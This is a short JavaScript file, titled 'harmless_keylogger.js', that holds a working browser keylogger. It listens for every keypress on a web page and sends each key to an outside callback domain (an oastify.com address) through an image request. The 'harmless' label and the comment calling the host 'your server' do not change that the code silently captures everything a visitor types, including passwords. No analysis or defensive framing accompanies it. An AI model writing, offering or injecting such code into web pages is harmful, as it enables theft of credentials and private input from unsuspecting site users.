// harmless_keylogger.js
document.addEventListener('keydown', function (e) {
    const keystroke = e.key;
    const img = new Image();
    img.src = 'https://u4z15nlnog5ink147lbrny1g97fy3t2hr.oastify.com/log?key=' + encodeURIComponent(keystroke);
    document.body.appendChild(img); // This sends the keystroke to your server
});
